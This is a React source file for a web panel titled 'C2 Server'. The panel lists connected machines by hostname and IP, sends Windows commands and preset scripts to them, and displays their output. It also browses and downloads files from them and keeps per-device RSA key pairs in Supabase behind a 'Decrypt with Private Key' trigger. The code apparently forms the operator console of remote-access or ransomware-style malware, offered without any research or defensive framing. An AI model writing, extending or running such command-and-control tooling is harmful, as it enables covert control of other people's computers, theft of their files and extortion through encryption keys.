import { useEffect, useMemo, useRef, useState } from 'react'
import { initSocket } from './socketClient'
import { supabase } from './lib/supabase'
import './modern.css'

export default function FreshUI() {
  const DEFAULT_RAW = import.meta.env.VITE_API_BASE || 'http://localhost:8080/api'
  const [host, setHost] = useState(() => {
    const saved = (typeof window !== 'undefined') ? localStorage.getItem('ui.host') : null
    return (saved || DEFAULT_RAW).replace(/\/$/, '')
  })
  const API_BASE = useMemo(() => `${host}/py_simple`, [host])

  const [socketStatus, setSocketStatus] = useState('disconnected')
  const socketRef = useRef(null)
  const [lastOutput, setLastOutput] = useState(null)

  const [devices, setDevices] = useState([])
  const [selectedToken, setSelectedToken] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem('ui.selectedToken') || '' : ''))
  const [connectedCount, setConnectedCount] = useState(0)
  const [systemOnline, setSystemOnline] = useState(false)
  const [status, setStatus] = useState('')
  const [loading, setLoading] = useState(false)

  // Keys
  const [publicKey, setPublicKey] = useState('')
  const [privateKey, setPrivateKey] = useState('')
  const [userId, setUserId] = useState(() => (typeof window !== 'undefined' ? localStorage.getItem('ui.userId') || '' : ''))

  // Scripts
  const [scripts, setScripts] = useState([]) // [{id, label, command}]
  const [selectedScripts, setSelectedScripts] = useState({}) // map by id -> true

  // Terminal
  const [command, setCommand] = useState('')

  // Files
  const [files, setFiles] = useState([]) // [{name, is_dir, size}]
  const [c2Path, setC2Path] = useState('') // '' means root
  const [c2Token, setC2Token] = useState('') // optional X-C2-TOKEN
  const [showFiles, setShowFiles] = useState(false) // optional extra panel
  const [collapseOnline, setCollapseOnline] = useState(false)
  const [collapseOffline, setCollapseOffline] = useState(true)

  useEffect(() => {
    try {
      socketRef.current = initSocket({
        apiBase: API_BASE,
        onStatus: (st) => setSocketStatus(st),
        onAck: () => {},
        onScriptOutput: (payload) => setLastOutput(payload || null),
        startDeviceOnConnect: true,
      })
    } catch (_) {}
    return () => { try { socketRef.current?.disconnect() } catch (_) {} }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [API_BASE])

  useEffect(() => {
    refreshAll()
    const id = setInterval(refreshAll, 5000)
    return () => clearInterval(id)
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [API_BASE])

  // Persist host, userId, selectedToken
  useEffect(() => { try { localStorage.setItem('ui.host', host) } catch {} }, [host])
  useEffect(() => { try { localStorage.setItem('ui.userId', userId) } catch {} }, [userId])
  useEffect(() => { try { if (selectedToken) localStorage.setItem('ui.selectedToken', selectedToken) } catch {} }, [selectedToken])

  // Auto-load keys when userId and selectedToken are set
  useEffect(() => {
    if (!userId || !selectedToken) return
    ;(async () => {
      try {
        const rec = await loadKeysFromSupabase({ userId, token: selectedToken })
        if (rec) {
          setPublicKey(rec.public_key_pem || '')
          setPrivateKey(rec.private_key_pem || '')
          setStatus('Loaded keys for selection')
        }
      } catch (_) { /* ignore */ }
    })()
  }, [userId, selectedToken])

  // Auto-generate persistent userId if missing (no search/input box needed)
  useEffect(() => {
    if (userId) return
    try {
      const gen = () => {
        const arr = new Uint8Array(16)
        window.crypto.getRandomValues(arr)
        return Array.from(arr).map(b=>b.toString(16).padStart(2,'0')).join('')
      }
      const id = gen()
      setUserId(id)
      localStorage.setItem('ui.userId', id)
    } catch {
      // Fallback
      const id = 'guest-' + Math.random().toString(36).slice(2, 10)
      setUserId(id)
      try { localStorage.setItem('ui.userId', id) } catch {}
    }
  }, [])

  // Populate keys from selected device registry when devices refresh/selection changes
  useEffect(() => {
    if (!selectedToken) return
    const d = devices.find(x=>x.token===selectedToken)
    if (d) {
      if (d.public_key_pem) setPublicKey(d.public_key_pem)
      if (d.private_key_pem) setPrivateKey(d.private_key_pem)
    }
  }, [devices, selectedToken])

  async function refreshAll() {
    await Promise.allSettled([
      refreshDevices(),
      refreshScripts(),
      refreshFiles(),
    ])
  }

  async function refreshDevices() {
    try {
      const res = await fetch(`${API_BASE}/devices`)
      if (!res.ok) throw new Error('devices')
      const data = await res.json()
      const list = data.devices || []
      setDevices(list)
      setConnectedCount(list.filter(d => d.connected).length)
      setSystemOnline(true)
      if (list.length && !selectedToken) setSelectedToken(list[0].token)
    } catch (_) { setSystemOnline(false) }
  }

  async function refreshScripts() {
    try {
      const res = await fetch(`${API_BASE}/scripts`)
      if (!res.ok) throw new Error('scripts')
      const data = await res.json()
      setScripts(Array.isArray(data?.scripts) ? data.scripts : [])
    } catch (_) {
      setScripts([
        { id: 'scriptA', label: 'Script A', command: 'echo Script A' },
        { id: 'scriptB', label: 'Script B', command: 'echo Script B' },
        { id: 'scriptC', label: 'Script C', command: 'echo Script C' },
      ])
    }
  }

  async function refreshFiles() {
    try {
      const headers = c2Token ? { 'X-C2-TOKEN': c2Token } : undefined
      let res, data
      if (!c2Path) {
        res = await fetch(`${API_BASE}/c2`, { headers })
        if (!res.ok) throw new Error('files')
        data = await res.json()
        setFiles(Array.isArray(data?.files) ? data.files : [])
      } else {
        const url = new URL(`${API_BASE}/c2/list`, window.location.origin)
        url.searchParams.set('path', c2Path)
        res = await fetch(url, { headers })
        if (!res.ok) throw new Error('files')
        data = await res.json()
        setFiles(Array.isArray(data?.files) ? data.files : [])
      }
    } catch (_) { setFiles([]) }
  }

  // Actions
  async function generateKeys() {
    try {
      setLoading(true); setStatus('')
      const res = await fetch(`${API_BASE}/keys/rsa`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({}) })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`)
      setPublicKey(data.public_key_pem || '')
      setPrivateKey(data.private_key_pem || '')
      setStatus('Key pair generated')
      // Auto-save to Supabase if configured and user provided
      if (userId && selectedToken) {
        await saveKeysToSupabase({ userId, token: selectedToken, pub: data.public_key_pem, prv: data.private_key_pem })
      }
    } catch (e) { setStatus(`Key generation failed: ${e}`) } finally { setLoading(false) }
  }

  async function sendPublicKey() {
    if (!selectedToken || !publicKey) { setStatus('Select a device and generate a public key first'); return }
    try {
      setLoading(true)
      const res = await fetch(`${API_BASE}/devices/${selectedToken}/keys`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ public_key_pem: publicKey }) })
      if (!res.ok) { const d = await res.json().catch(()=>({})); throw new Error(d?.error || `HTTP ${res.status}`) }
      setStatus('Public key stored on server for device')
      await refreshDevices()
      if (userId) {
        await saveKeysToSupabase({ userId, token: selectedToken, pub: publicKey, prv: null })
      }
    } catch (e) { setStatus(`Send failed: ${e}`) } finally { setLoading(false) }
  }

  async function decryptWithPrivateKey() {
    if (!selectedToken || !privateKey) { setStatus('Select a device and generate a private key first'); return }
    try {
      setLoading(true)
      // Attach private key then trigger decrypt
      await fetch(`${API_BASE}/devices/${selectedToken}/keys`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ private_key_pem: privateKey }) }).catch(()=>{})
      if (socketRef.current && socketStatus === 'connected') {
        socketRef.current.emit('site_decrypt', { token: selectedToken })
      } else {
        await fetch(`${API_BASE}/decrypt`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken }) })
      }
      setStatus('Decrypt triggered')
      if (userId) {
        await saveKeysToSupabase({ userId, token: selectedToken, pub: null, prv: privateKey })
      }
    } catch (e) { setStatus(`Decrypt failed: ${e}`) } finally { setLoading(false) }
  }

  async function runSelectedScripts() {
    if (!selectedToken) { setStatus('Select a device'); return }
    const chosen = scripts.filter(s => selectedScripts[s.id])
    if (!chosen.length) { setStatus('Select at least one script'); return }
    setLoading(true)
    try {
      for (const s of chosen) {
        if (socketRef.current && socketStatus === 'connected') {
          socketRef.current.emit('site_run', { token: selectedToken, command: s.command })
        } else {
          await fetch(`${API_BASE}/device/run`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken, command: s.command }) })
        }
      }
      setStatus('Scripts dispatched')
    } catch (e) { setStatus(`Script run failed: ${e}`) } finally { setLoading(false) }
  }

  async function executeCommand() {
    if (!selectedToken || !command.trim()) { setStatus('Select a device and enter a command'); return }
    try {
      setLoading(true)
      const res = await fetch(`${API_BASE}/device/run`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken, command }) })
      const data = await res.json().catch(()=>({}))
      if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`)
      setStatus(data?.status || 'Command sent')
    } catch (e) { setStatus(`Command failed: ${e}`) } finally { setLoading(false) }
  }

  const deviceNames = devices.map(d => ({ label: `${d.hostname || d.token.slice(0,8)} • ${d.ip || 'ip?'} • ${d.connected ? 'online' : 'offline'}`, value: d.token }))

  const filesWithPaths = files.map(f => ({
    ...f,
    // compute relative path for downloads
    relPath: (c2Path ? `${c2Path.replace(/\/+$/, '')}/` : '') + (f.name || ''),
  }))

  return (
    <div className="ui-root">
      <header className="ui-header">
        <div className="brand">
          <div className="logo">⚡</div>
          <div>
            <div className="title">C2 Server</div>
            <div className="subtitle"> </div>
          </div>
        </div>
        <div className="header-right">
          <div className="stat-chip"><span className="dot" style={{background: connectedCount>0?'#10b981':'#ef4444'}}></span>{connectedCount} online</div>
          <div className="stat-chip">Socket: {socketStatus}</div>
          {/* User ID is auto-generated and persisted; no user search box*/}
        </div>
      </header>

      <main className="ui-main">
        <aside className="ui-sidebar">
          <div className="tree">
            <div className="tree-title">Devices</div>
            <div className="tree-section">
              <button className="tree-section-header" onClick={()=>setCollapseOnline(v=>!v)}>
                <span className={`chev ${collapseOnline?'rot':''}`}>▸</span>
                Online <span className="muted">({devices.filter(d=>d.connected).length})</span>
              </button>
              {!collapseOnline && (
                <ul className="tree-list">
                  {devices.filter(d=>d.connected).map(d => (
                    <li key={d.token} className={`tree-item ${selectedToken===d.token?'selected':''}`} onClick={()=>setSelectedToken(d.token)}>
                      <span className="status-dot ok"></span>
                      <span className="name">{d.hostname || d.token.slice(0,8)}</span>
                      <span className="meta">{d.ip || ''}</span>
                    </li>
                  ))}
                </ul>
              )}
            </div>
            <div className="tree-section">
              <button className="tree-section-header" onClick={()=>setCollapseOffline(v=>!v)}>
                <span className={`chev ${collapseOffline?'rot':''}`}>▸</span>
                Offline <span className="muted">({devices.filter(d=>!d.connected).length})</span>
              </button>
              {!collapseOffline && (
                <ul className="tree-list">
                  {devices.filter(d=>!d.connected).map(d => (
                    <li key={d.token} className={`tree-item ${selectedToken===d.token?'selected':''}`} onClick={()=>setSelectedToken(d.token)}>
                      <span className="status-dot warn"></span>
                      <span className="name">{d.hostname || d.token.slice(0,8)}</span>
                      <span className="meta">{d.ip || ''}</span>
                    </li>
                  ))}
                </ul>
              )}
            </div>
            <div className="sidebar-actions">
              <button className="btn" onClick={refreshDevices}>Refresh</button>
            </div>
          </div>
        </aside>

        <section className="ui-content">
          {/* Overview strip */}
          <div className="stats">
            <div className="card stat">
              <div className="label">System</div>
              <div className={`value ${systemOnline?'ok':'warn'}`}>{systemOnline ? 'Online' : 'Offline'}</div>
            </div>
            <div className="card stat">
              <div className="label">Devices</div>
              <div className="value">{connectedCount} connected</div>
            </div>
            <div className="card stat">
              <div className="label">Socket</div>
              <div className="value">{socketStatus}</div>
            </div>
          </div>

          {/* Device summary */}
          <div className="panel card">
            <div className="panel-title">Device</div>
            {selectedToken ? (
              <div className="kv">
                {(() => { const d = devices.find(x=>x.token===selectedToken); return d ? (
                  <>
                    <div><span className="k">Token</span><span className="v">{d.token}</span></div>
                    <div><span className="k">Hostname</span><span className="v">{d.hostname || '—'}</span></div>
                    <div><span className="k">IP</span><span className="v">{d.ip || '—'}</span></div>
                    <div><span className="k">Status</span><span className="v">{d.connected ? 'online' : 'offline'}</span></div>
                  </>
                ) : null })()}
              </div>
            ) : (
              <div className="muted">Select a device from the left.</div>
            )}
          </div>

          {/* RSA Key Management (keys auto-generated on device socket auth; public key auto-available via /devices) */}
          <div className="panel card">
              <div className="panel-title">RSA Key Management</div>
              <div className="actions">
                <button className="btn danger" disabled={loading || !privateKey || !selectedToken} onClick={decryptWithPrivateKey}>Decrypt with Private Key</button>
              </div>
              <div className="grid two" style={{marginTop:12}}>
                <div>
                  <label className="field-label">Public Key</label>
                  <textarea className="input mono" rows={10} placeholder="Public key will appear here" value={publicKey} onChange={(e)=>setPublicKey(e.target.value)} />
                </div>
                <div>
                  <label className="field-label">Private Key</label>
                  <textarea className="input mono" rows={10} placeholder="Private key will appear here" value={privateKey} onChange={(e)=>setPrivateKey(e.target.value)} />
                </div>
              </div>
          </div>

          {/* Scripts */}
          <div className="panel card">
              <div className="panel-title">Scripts</div>
              <div className="script-grid">
                {scripts.map(s => (
                  <label key={s.id} className={`script card ${selectedScripts[s.id]?'checked':''}`}>
                    <input type="checkbox" checked={!!selectedScripts[s.id]} onChange={(e)=>setSelectedScripts(prev=>({...prev, [s.id]: e.target.checked}))} />
                    <div className="script-name">{s.label || s.id}</div>
                    <div className="script-cmd">{s.command}</div>
                  </label>
                ))}
              </div>
              <div className="actions">
                <button className="btn primary" disabled={loading || !selectedToken} onClick={runSelectedScripts}>Run Selected</button>
              </div>
          </div>

          {/* Terminal */}
          <div className="panel card">
              <div className="panel-title">Terminal</div>
              <label className="field-label">Command</label>
              <input className="input" placeholder="Enter Windows command..." value={command} onChange={(e)=>setCommand(e.target.value)} />
              <div className="actions">
                <button className="btn primary" disabled={loading || !selectedToken || !command.trim()} onClick={executeCommand}>Execute</button>
              </div>
              {lastOutput && (
                <div className="grid two" style={{marginTop:12}}>
                  <div>
                    <label className="field-label">Stdout</label>
                    <textarea className="input mono" rows={8} value={lastOutput.stdout || ''} readOnly />
                  </div>
                  <div>
                    <label className="field-label">Stderr</label>
                    <textarea className="input mono" rows={8} value={lastOutput.stderr || ''} readOnly />
                  </div>
                </div>
              )}
          </div>

          {/* Files (optional) */}
          {showFiles && (
            <div className="panel card">
              <div className="panel-title">Files</div>
              <div className="grid two" style={{alignItems:'end'}}>
                <div>
                  <label className="field-label">Path</label>
                  <input className="input" value={c2Path} onChange={(e)=>setC2Path(e.target.value.replace(/^\/+|\/+$/g, ''))} placeholder="" />
                </div>
                <div>
                  <label className="field-label">C2 Token (optional)</label>
                  <input className="input" value={c2Token} onChange={(e)=>setC2Token(e.target.value)} placeholder="X-C2-TOKEN" />
                </div>
              </div>
              <div className="actions">
                <button className="btn" onClick={refreshFiles}>Refresh</button>
                {!!c2Path && <button className="btn" onClick={()=>{ setC2Path(''); setTimeout(refreshFiles, 0) }}>Root</button>}
              </div>
              {files.length === 0 && <div className="muted">No files found.</div>}
              <div className="file-list">
                {filesWithPaths.map(f => (
                  f.is_dir ? (
                    <button key={f.relPath} className="file-row" onClick={()=>{ setC2Path(f.relPath); setTimeout(refreshFiles, 0) }}>
                      <span className="file-name">📁 {f.name}</span>
                      <span className="file-size">dir</span>
                    </button>
                  ) : (
                    <a key={f.relPath} className="file-row" href={`${API_BASE}/c2/download?path=${encodeURIComponent(f.relPath)}`} target="_blank" rel="noreferrer">
                      <span className="file-name">📄 {f.name}</span>
                      <span className="file-size">{f.size ? `${f.size} bytes` : ''}</span>
                    </a>
                  )
                ))}
              </div>
            </div>
          )}

          {status && <div className="toast" role="status">{status}</div>}
        </section>
      </main>
    </div>
  )
}

async function saveKeysToSupabase({ userId, token, pub, prv }) {
  if (!supabase) return
  const payload = { user_id: userId, device_token: token, public_key_pem: pub ?? null, private_key_pem: prv ?? null }
  const { error } = await supabase.from('device_keys').upsert(payload, { onConflict: 'user_id,device_token' })
  if (error) throw error
}

async function loadKeysFromSupabase({ userId, token }) {
  if (!supabase) return null
  const { data, error } = await supabase
    .from('device_keys')
    .select('public_key_pem, private_key_pem')
    .eq('user_id', userId)
    .eq('device_token', token)
    .limit(1)
    .maybeSingle()
  if (error) throw error
  return data
}
